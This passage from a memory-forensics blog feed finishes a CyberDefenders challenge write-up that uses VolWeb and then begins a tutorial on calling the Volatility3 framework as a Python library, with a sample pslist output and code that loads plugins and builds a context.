<p>For question <strong>#9</strong>, we need to investigate to find the full path and name of the last file opened in notepad. The CmdLine plugin is the way to go for this question. Indeed, we can go to the Process tab click on the notepad process, look at the "Cmdline" subtab and extract the answer which is <code>C:\Users\JOHNDO~1\AppData\Local\Temp\7zO4FB31F24\accountNum</code>.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/9-27ff8b18ba082b6a8c1016cb3ad01f33.png" title="PSTree" width="294" height="261" class="img_ev3q"></p>
<p>The last question is a little bit more tricky. Windows systems maintain a set of keys in the registry database (UserAssist keys) to keep track of programs that executed. We can use the UserAssist plugin and look for the execution of brave and how long it was used (Time Focused). The answer is <strong>04:01:54</strong></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/10-62b2680fd46667c67cdd686cd9d62dff.png" title="PSTree" width="1463" height="165" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/cb-brave#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>To conclude this writeup, we were able to use the VolWeb platform to easly get answers and make our investigation more efficient. VolWeb is based on volatility3 and therefore doesn't fully cover all the cyberdefenders.org memory analysis challenges questions at the moment. Happy hunting !</p>]]></content:encoded>
            <category>DFIR</category>
            <category>Memory Forensics</category>
            <category>Cyberdefenders</category>
        </item>
        <item>
            <title><![CDATA[üìò Using Volatility3 as a library]]></title>
            <link>https://forensicxlab.github.io/blog/volaslib</link>
            <guid>https://forensicxlab.github.io/blog/volaslib</guid>
            <pubDate>Mon, 30 May 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[Being interested in memory forensic for a while now, I have learned a lot about the volatility3 framework. In this article, we will go through how you can use the framework's libraries to automate your memory analysis tasks and directly exploit the results. I will assume in this article that the reader has a basic understanding of how volatility3 is exploiting memory to extract evidence. If you want to learn more about volatility3, you can check the links in the "References" section.]]></description>
            <content:encoded><![CDATA[<p>Being interested in memory forensic for a while now, I have learned a lot about the volatility3 framework. In this article, we will go through how you can use the framework's libraries to automate your memory analysis tasks and directly exploit the results. I will assume in this article that the reader has a basic understanding of how volatility3 is exploiting memory to extract evidence. If you want to learn more about volatility3, you can check the links in the "References" section.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="volatility3-cli">Volatility3 CLI<a href="https://forensicxlab.github.io/blog/volaslib#volatility3-cli" class="hash-link" aria-label="Direct link to Volatility3 CLI" title="Direct link to Volatility3 CLI">‚Äã</a></h2>
<p>When using the volatility3 framework on a memory image, the analyst is typically using the command line interface (CLI) component of the framework. It is one of the best way to interact with the framework quickly and get results. In the below example, we are executing the PsList plugin on a memory dump using the CLI.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">¬ª vol </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-r</span><span class="token plain"> pretty </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f</span><span class="token plain"> Triage-Memory.mem windows.pslist</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Volatility </span><span class="token number">3</span><span class="token plain"> Framework </span><span class="token number">2.0</span><span class="token plain">.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Formatting</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.0.00		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token operator">|</span><span class="token plain">  PID </span><span class="token operator">|</span><span class="token plain"> </span><span class="token environment constant" style="color:rgb(189, 147, 249)">PPID</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  ImageFileName </span><span class="token operator">|</span><span class="token plain">      Offset</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">V</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> Threads </span><span class="token operator">|</span><span class="token plain"> Handles </span><span class="token operator">|</span><span class="token plain"> SessionId </span><span class="token operator">|</span><span class="token plain"> Wow64 </span><span class="token operator">|</span><span class="token plain">                  CreateTime </span><span class="token operator">|</span><span class="token plain"> ExitTime </span><span class="token operator">|</span><span class="token plain"> File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">    </span><span class="token number">4</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         System </span><span class="token operator">|</span><span class="token plain"> 0xfa8003c72b30 </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">87</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">547</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">       N/A </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:31:55.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">252</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    </span><span class="token number">4</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">       smss.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa8004616040 </span><span class="token operator">|</span><span class="token plain">       </span><span class="token number">2</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">30</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">       N/A </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:31:55.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">332</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">324</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">      csrss.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa80050546b0 </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">10</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">516</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:31:58.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">372</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">364</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">      csrss.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa800525a9e0 </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">11</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">557</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">1</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:31:58.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">380</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">324</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    wininit.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa8005259060 </span><span class="token operator">|</span><span class="token plain">       </span><span class="token number">3</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">78</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:31:58.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">416</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">364</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">   winlogon.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa8005268b30 </span><span class="token operator">|</span><span class="token plain">       </span><span class="token number">3</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">110</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">1</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:31:58.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">476</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">380</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">   services.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa8005680910 </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">12</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">224</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:31:59.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">484</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">380</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">      lsass.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa80056885e0 </span><span class="token operator">|</span><span class="token plain">       </span><span class="token number">7</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">650</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:32:00.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">492</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">380</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">        lsm.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa8005696b30 </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">10</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">155</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:32:00.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">592</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">476</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    svchost.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa80056e1060 </span><span class="token operator">|</span><span class="token plain">       </span><span class="token number">9</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">375</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:32:01.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">672</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">476</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    svchost.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa800570d060 </span><span class="token operator">|</span><span class="token plain">       </span><span class="token number">7</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">341</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:32:02.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">764</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">476</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    svchost.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa800575e5b0 </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">20</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">447</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:32:02.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">796</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">476</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    svchost.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa8005775b30 </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">15</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">     </span><span class="token number">368</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:32:03.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  * </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">820</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">  </span><span class="token number">476</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    svchost.exe </span><span class="token operator">|</span><span class="token plain"> 0xfa800577db30 </span><span class="token operator">|</span><span class="token plain">      </span><span class="token number">33</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">    </span><span class="token number">1073</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain">         </span><span class="token number">0</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">2019</span><span class="token plain">-03-22 05:32:03.000000  </span><span class="token operator">|</span><span class="token plain">      N/A </span><span class="token operator">|</span><span class="token plain">    Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">etc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Having those results is a great way to help you during an investigation, but what if we want to make the framework perform more specific tasks to include it to another platform ? For example, you may want to integrate the results directly inside a sandbox or a Web UI. Behind the scene of the execution of this command, volatility3 is using multiple libraries from the framework to produce its results. It's simply parsing the user's arguments and perform the following steps :</p>
<ul>
<li>Create an empty memory context for the memory image;</li>
<li>Determine if the requested plugin exists in the available list of plugins;</li>
<li>Determine what configuration options the plugin requires;</li>
<li>Complete the context configuration using the plugin requirements, automagics and the user's arguments;</li>
<li>Run the plugin;</li>
<li>Render the result into the desired format.</li>
</ul>
<p>Great, now you have a high level understanding of what's going on in the background when attempting to run a plugin. Using the Volatility3 documentation, let's try to write a simple sample of code to run the PsList plugin with volatility3 as a library.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="constructing-and-running-a-plugin">Constructing and running a plugin<a href="https://forensicxlab.github.io/blog/volaslib#constructing-and-running-a-plugin" class="hash-link" aria-label="Direct link to Constructing and running a plugin" title="Direct link to Constructing and running a plugin">‚Äã</a></h2>
<p>In this section we will take a look at how we can run the PsList pluging using volatility3 as a library. Let's first take a look at the following code sample :</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> contexts</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> volatility3 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> plugins</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> logging</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">basicConfig</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">level</span><span class="token operator">=</span><span class="token plain">logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">INFO</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logger </span><span class="token operator">=</span><span class="token plain"> logging</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">getLogger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">require_interface_version</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ctx </span><span class="token operator">=</span><span class="token plain"> contexts</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)">## Construct a blank context</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">failures </span><span class="token operator">=</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">import_files</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">##Load the framework plugins</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> failures</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Some volatility3 plugin couldn't be loaded : </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">failures</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Plugins are loaded without failure"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">plugin_list </span><span class="token operator">=</span><span class="token plain"> volatility3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">list_plugins</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">plugin_list</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>OUTPUT :</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:__main__:Plugins are loaded without failure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">INFO:__main__:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">{</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">'windows.statistics.Statistics': ,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">'timeliner.Timeliner': ,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">'windows.pslist.PsList': ,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In this first step, we have constructed a blank context and loaded the native framework plugins. Next, we need to choose which plugin we want to run and construct the appropriate context based on its requirements. For this, I propose we create a function which can construct a simple plugin with no specific arguments.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">1    def build_context(image_name ,context, base_config_path, plugin):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2        available_automagics = automagic.available(context)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3        plugin_config_path = interfaces.configuration.path_join(base_config_path, plugin.__name__)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4        automagics = automagic.choose_automagic(available_automagics, plugin)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5        context.config['automagic.LayerStacker.stackers'] = automagic.stacker.choose_os_stackers(plugin)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">6        context.config['automagic.LayerStacker.single_location'] = "file://" + os.getcwd() + "/" + image_name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7        constructed = construct_plugin(context, automagics, plugin, base_config_path, None, None)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">8        return constructed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 